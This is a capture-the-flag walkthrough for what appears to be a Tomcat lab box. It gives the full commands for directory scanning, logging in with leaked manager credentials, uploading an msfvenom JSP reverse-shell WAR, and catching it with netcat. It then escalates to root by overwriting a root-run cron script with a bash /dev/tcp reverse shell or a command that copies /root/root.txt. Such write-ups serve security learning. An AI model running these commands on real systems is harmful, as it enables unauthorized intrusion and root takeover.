#### Scan the machine.

Seems like we have server running on `port 8080`. The website has nothing interesting. So I ran `gobuster` scan.

Command -> `gobuster dir -u http://<IP>:8080 -w /usr/share/wordlists/dirb/common.txt -x txt,html,php`

```

I checked `/manager` and `/host-manager` they both required password. On `/manager`, I tried `admin:admin`. It didn't work and gave me an error with some useful information.

![Password](images/manager_password.png)
> Seems like we have username and password.

Refresh the page and login using this credentials. BAAM! We have the access. Did some recon and found a useful article on [Ways to Exploit Tomcat Manager][3].

We can upload `war` shell and get the access. To create reverse shell, use `msfvenom`.

Command -> `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f war > shell.war`.

![War Shell](images/war_shell.png)

You we can upload this file into `WAR` section and deploy the file.

![Upload Shell](images/war_website.png)


The page will reload and you will see the path for shell.

![Shell Location](images/shell.png)

Start a listener using `netcat`. Command -> `nc -lvnp 4444`. Go to the site `http://<IP>:8080/shell`.

You will see a connection established.

![Got Connection](images/got_connection.png)
> Now we have access as *tomcat*.

We can easily get the user flag from the home directory.

### Privilege Escalation

There is one more file `id.sh` in the user directory.

![Files](images/files_user.png)

`id.sh` is running `id` command and writing the content in `test.txt`. The content of `test.txt` seems like `root` user's ID.

That means this file is running as `root` and fortunately we have write permissions to this file. We can simply edit this file and can get the root flag/access.

#### Method 1: Get Root Access

To get the root access. We can add one liner bash shell command. To do this -> `echo "bash -i >& /dev/tcp/<YOUR_IP/4445 0>&1" > id.sh`.

Also, start a listener -> `nc -lvnp 4445`. Wait for a while you will get the access. It may take sometime to get the connection depending on `cronjob` settings.

You know what to do next :stuck_out_tongue_winking_eye:

#### Method 2: Get Root Flag Directly

To get the root flag. We can simple type -> `echo "cat /root/root.txt > test.txt" > id.sh`. As we already know the location of the file. We can simply print the content of the file to the terminal and redirects the output to `test.txt` file.

![Exploit Code](images/exploit.png)

Check the content of the `test.txt` file. If may take sometime.
